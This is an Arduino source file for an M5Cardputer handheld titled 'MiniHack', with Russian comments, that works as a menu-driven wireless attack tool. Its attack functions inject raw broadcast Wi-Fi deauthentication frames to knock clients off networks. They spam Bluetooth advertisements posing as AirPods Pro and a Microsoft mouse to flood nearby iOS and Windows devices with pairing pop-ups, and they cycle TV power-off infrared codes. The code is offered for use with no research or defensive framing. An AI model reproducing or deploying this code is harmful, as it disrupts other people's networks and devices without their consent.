#include <M5Cardputer.h>
#include <M5Unified.h>
#include <M5GFX.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <IRremote.hpp>

// --- Пины и константы ---
#define IR_TX_PIN 44
#define SCREEN_W 240
#define SCREEN_H 135
#define STATUS_H 16
#define FOOTER_H 15

// --- Глобальные объекты ---
M5Canvas canvas(&M5Cardputer.Display);
IRsend IrSender;

// --- Состояния UI ---
enum ScreenState { MAIN_MENU, SUB_MENU_WIFI, SUB_MENU_BLE, SUB_MENU_IR, SUB_MENU_SETTINGS };
ScreenState currentScreen = MAIN_MENU;

// --- Пункты меню ---
const char* mainMenuItems[] = {"Wi-Fi Deauth", "BLE Spam", "IR TV-B-Gone", "Settings"};
const int mainMenuCount = 4;
int mainMenuIndex = 0;

const char* wifiMenuItems[] = {"START / STOP", "Back"};
const int wifiMenuCount = 2;
int wifiMenuIndex = 0;

const char* bleMenuItems[] = {"AppleJuice (iOS)", "SwiftPair (Windows)", "STOP SPAM", "Back"};
const int bleMenuCount = 4;
int bleMenuIndex = 0;

const char* irMenuItems[] = {"Samsung", "LG", "Sony", "Brute Force All", "Back"};
const int irMenuCount = 5;
int irMenuIndex = 0;

const char* settingsMenuItems[] = {"Brightness +", "Brightness -", "Back"};
const int settingsMenuCount = 3;
int settingsMenuIndex = 0;

// --- Флаги активных атак ---
bool wifiDeauthActive = false;
bool bleSpamActive = false;
bool irBruteActive = false;
int bleSpamMode = 0; // 1=AppleJuice, 2=SwiftPair
int irBrandIndex = 0;

// --- Таймеры (неблокирующие) ---
unsigned long lastWifiSend = 0;
unsigned long lastBleSend = 0;
unsigned long lastIrSend = 0;
const unsigned long WIFI_INTERVAL = 100;
const unsigned long BLE_INTERVAL = 50;
const unsigned long IR_INTERVAL = 2000;

// --- BLE ---
BLEAdvertising* pAdvertising = nullptr;

// ==================== ИНИЦИАЛИЗАЦИЯ ====================
void setup() {
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
  M5Cardputer.Display.setBrightness(150);
  M5Cardputer.Display.setRotation(1);

  canvas.createSprite(SCREEN_W, SCREEN_H);
  canvas.setTextWrap(false);

  // ИК-передатчик
  IrSender.begin(IR_TX_PIN, DISABLE_LED_FEEDBACK);

  // Wi-Fi в режиме STA для raw-инъекций
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  // BLE
  BLEDevice::init("MiniHack");
  BLEServer* pServer = BLEDevice::createServer();
  pAdvertising = BLEDevice::getAdvertising();

  drawUI();
}

// ==================== ОСНОВНОЙ ЦИКЛ ====================
void loop() {
  M5Cardputer.update();

  handleInput();
  updateAttacks();
  drawUI();

  delay(10); // Короткая задержка для стабильности
}

// ==================== ОБРАБОТКА ВВОДА ====================
void handleInput() {
  if (!M5Cardputer.Keyboard.isChange()) return;

  bool fnPressed = M5Cardputer.Keyboard.isKeyPressed(KEY_FN);

  // Навигация вверх/вниз (Fn + ; / Fn + .)
  if (fnPressed && M5Cardputer.Keyboard.isKeyPressed(';')) {
    navigateUp();
    return;
  }
  if (fnPressed && M5Cardputer.Keyboard.isKeyPressed('.')) {
    navigateDown();
    return;
  }

  // Назад (Fn + `)
  if (fnPressed && M5Cardputer.Keyboard.isKeyPressed('`')) {
    goBack();
    return;
  }

  // Enter
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    selectItem();
    return;
  }
}

void navigateUp() {
  switch (currentScreen) {
    case MAIN_MENU: mainMenuIndex = (mainMenuIndex - 1 + mainMenuCount) % mainMenuCount; break;
    case SUB_MENU_WIFI: wifiMenuIndex = (wifiMenuIndex - 1 + wifiMenuCount) % wifiMenuCount; break;
    case SUB_MENU_BLE: bleMenuIndex = (bleMenuIndex - 1 + bleMenuCount) % bleMenuCount; break;
    case SUB_MENU_IR: irMenuIndex = (irMenuIndex - 1 + irMenuCount) % irMenuCount; break;
    case SUB_MENU_SETTINGS: settingsMenuIndex = (settingsMenuIndex - 1 + settingsMenuCount) % settingsMenuCount; break;
  }
}

void navigateDown() {
  switch (currentScreen) {
    case MAIN_MENU: mainMenuIndex = (mainMenuIndex + 1) % mainMenuCount; break;
    case SUB_MENU_WIFI: wifiMenuIndex = (wifiMenuIndex + 1) % wifiMenuCount; break;
    case SUB_MENU_BLE: bleMenuIndex = (bleMenuIndex + 1) % bleMenuCount; break;
    case SUB_MENU_IR: irMenuIndex = (irMenuIndex + 1) % irMenuCount; break;
    case SUB_MENU_SETTINGS: settingsMenuIndex = (settingsMenuIndex + 1) % settingsMenuCount; break;
  }
}

void selectItem() {
  switch (currentScreen) {
    case MAIN_MENU:
      if (mainMenuIndex == 0) { currentScreen = SUB_MENU_WIFI; wifiMenuIndex = 0; }
      else if (mainMenuIndex == 1) { currentScreen = SUB_MENU_BLE; bleMenuIndex = 0; }
      else if (mainMenuIndex == 2) { currentScreen = SUB_MENU_IR; irMenuIndex = 0; }
      else if (mainMenuIndex == 3) { currentScreen = SUB_MENU_SETTINGS; settingsMenuIndex = 0; }
      break;

    case SUB_MENU_WIFI:
      if (wifiMenuIndex == 0) { wifiDeauthActive = !wifiDeauthActive; }
      else if (wifiMenuIndex == 1) { goBack(); }
      break;

    case SUB_MENU_BLE:
      if (bleMenuIndex == 0) { bleSpamActive = true; bleSpamMode = 1; }
      else if (bleMenuIndex == 1) { bleSpamActive = true; bleSpamMode = 2; }
      else if (bleMenuIndex == 2) { bleSpamActive = false; bleSpamMode = 0; }
      else if (bleMenuIndex == 3) { goBack(); }
      break;

    case SUB_MENU_IR:
      if (irMenuIndex == 0) { irBrandIndex = 0; sendIrCode(0); }
      else if (irMenuIndex == 1) { irBrandIndex = 1; sendIrCode(1); }
      else if (irMenuIndex == 2) { irBrandIndex = 2; sendIrCode(2); }
      else if (irMenuIndex == 3) { irBruteActive = !irBruteActive; }
      else if (irMenuIndex == 4) { goBack(); }
      break;

    case SUB_MENU_SETTINGS:
      if (settingsMenuIndex == 0) {
        int b = M5Cardputer.Display.getBrightness();
        M5Cardputer.Display.setBrightness(min(255, b + 25));
      } else if (settingsMenuIndex == 1) {
        int b = M5Cardputer.Display.getBrightness();
        M5Cardputer.Display.setBrightness(max(0, b - 25));
      } else if (settingsMenuIndex == 2) {
        goBack();
      }
      break;
  }
}

void goBack() {
  currentScreen = MAIN_MENU;
}

// ==================== АТАКИ (НЕБЛОКИРУЮЩИЕ) ====================
void updateAttacks() {
  unsigned long now = millis();

  if (wifiDeauthActive && now - lastWifiSend >= WIFI_INTERVAL) {
    lastWifiSend = now;
    sendDeauthFrame();
  }

  if (bleSpamActive && now - lastBleSend >= BLE_INTERVAL) {
    lastBleSend = now;
    sendBleSpam(bleSpamMode);
  }

  if (irBruteActive && now - lastIrSend >= IR_INTERVAL) {
    lastIrSend = now;
    sendIrCode(irBrandIndex);
    irBrandIndex = (irBrandIndex + 1) % 3;
  }
}

// --- Wi-Fi Deauth ---
void sendDeauthFrame() {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,             // Frame Control, Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Source (fake BSSID)
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // BSSID (fake)
    0x00, 0x00,                         // Sequence control
    0x07, 0x00                          // Reason code
  };
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

// --- BLE Spam ---
void sendBleSpam(int mode) {
  if (!pAdvertising) return;

  BLEAdvertisementData advData;
  String name;

  if (mode == 1) {
    // AppleJuice: эмуляция AirPods Pro
    uint8_t appleData[] = {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0B, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    advData.addData(std::string((char*)appleData, sizeof(appleData)));
    name = "AirPods Pro";
  } else if (mode == 2) {
    // SwiftPair: эмуляция Microsoft Bluetooth Mouse
    uint8_t swiftData[] = {0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x00};
    advData.addData(std::string((char*)swiftData, sizeof(swiftData)));
    name = "Microsoft Mouse";
  } else {
    return;
  }

  advData.setName(name.c_str());
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();
  delay(10); // Короткая пауза для завершения рекламы
  pAdvertising->stop();
}

// --- IR TV-B-Gone ---
void sendIrCode(int brand) {
  switch (brand) {
    case 0: // Samsung
      IrSender.sendSAMSUNG(0xE0E040BF, 32);
      break;
    case 1: // LG (NEC)
      IrSender.sendNEC(0x20DF10EF, 32);
      break;
    case 2: // Sony
      IrSender.sendSony(0xA90, 12, 2);
      break;
    default:
      break;
  }
}

// ==================== ОТРИСОВКА UI ====================
void drawUI() {
  canvas.fillSprite(TFT_BLACK);

  // Верхняя панель
  canvas.fillRect(0, 0, SCREEN_W, STATUS_H, TFT_NAVY);
  canvas.setTextColor(TFT_WHITE);
  canvas.setTextSize(1);
  canvas.setCursor(4, 2);
  canvas.print("MiniHack v1.0");

  int battery = M5Cardputer.Power.getBatteryLevel();
  String batStr = String(battery) + "%";
  canvas.setCursor(SCREEN_W - 40, 2);
  canvas.print(batStr);

  // Основное меню
  int y = STATUS_H + 6;
  const int lineH = 18;

  switch (currentScreen) {
    case MAIN_MENU:
      drawMenuItems(mainMenuItems, mainMenuCount, mainMenuIndex, y);
      break;
    case SUB_MENU_WIFI:
      drawMenuItems(wifiMenuItems, wifiMenuCount, wifiMenuIndex, y);
      drawWifiStatus(y + wifiMenuCount * lineH + 6);
      break;
    case SUB_MENU_BLE:
      drawMenuItems(bleMenuItems, bleMenuCount, bleMenuIndex, y);
      drawBleStatus(y + bleMenuCount * lineH + 6);
      break;
    case SUB_MENU_IR:
      drawMenuItems(irMenuItems, irMenuCount, irMenuIndex, y);
      drawIrStatus(y + irMenuCount * lineH + 6);
      break;
    case SUB_MENU_SETTINGS:
      drawMenuItems(settingsMenuItems, settingsMenuCount, settingsMenuIndex, y);
      break;
  }

  // Нижняя панель
  canvas.fillRect(0, SCREEN_H - FOOTER_H, SCREEN_W, FOOTER_H, TFT_DARKGREY);
  canvas.setTextColor(TFT_WHITE);
  canvas.setTextSize(0.5);
  canvas.setCursor(4, SCREEN_H - FOOTER_H + 2);
  canvas.print("Fn+;/. - Nav | Enter - OK | Fn+` - Back");

  canvas.pushSprite(0, 0);
}

void drawMenuItems(const char** items, int count, int selected, int startY) {
  const int lineH = 18;
  for (int i = 0; i < count; i++) {
    int yPos = startY + i * lineH;
    if (i == selected) {
      canvas.fillRect(4, yPos, SCREEN_W - 8, lineH, TFT_WHITE);
      canvas.setTextColor(TFT_BLACK);
    } else {
      canvas.setTextColor(TFT_WHITE);
    }
    canvas.setCursor(8, yPos + 2);
    canvas.print(items[i]);
  }
}

void drawWifiStatus(int y) {
  canvas.setTextColor(wifiDeauthActive ? TFT_GREEN : TFT_RED);
  canvas.setCursor(8, y);
  canvas.print(wifiDeauthActive ? "Status: ACTIVE" : "Status: STOPPED");
}

void drawBleStatus(int y) {
  canvas.setTextColor(bleSpamActive ? TFT_GREEN : TFT_RED);
  canvas.setCursor(8, y);
  if (bleSpamActive) {
    canvas.print(bleSpamMode == 1 ? "Spam: AppleJuice" : "Spam: SwiftPair");
  } else {
    canvas.print("Spam: STOPPED");
  }
}

void drawIrStatus(int y) {
  canvas.setTextColor(irBruteActive ? TFT_GREEN : TFT_WHITE);
  canvas.setCursor(8, y);
  if (irBruteActive) {
    canvas.print("Brute Force: ACTIVE");
  } else {
    canvas.print("Last: " + String(irMenuItems[irBrandIndex]));
  }
}
